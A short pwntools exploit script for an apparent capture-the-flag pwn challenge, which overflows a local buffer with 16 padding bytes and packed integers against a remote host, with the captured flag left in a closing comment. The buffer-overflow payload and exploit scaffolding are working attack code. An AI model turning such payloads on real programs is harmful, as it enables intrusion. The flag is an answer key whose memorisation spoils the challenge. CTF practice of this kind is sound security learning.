#!/usr/bin/python3

from pwn import *

exe = ELF('challenge', checksec=False)
# libc = ELF('0', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                brva 0x128E

                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('chal.osugaming.lol', 7279)
else:
        p = process(exe.path)

GDB()
sleep(1)

sl(str(727))
sleep(1)
sl(b'a'*16 + p64(720) + p32(727)+p32(727))
p.interactive()
# osu{i_cant_believe_i_saw_it}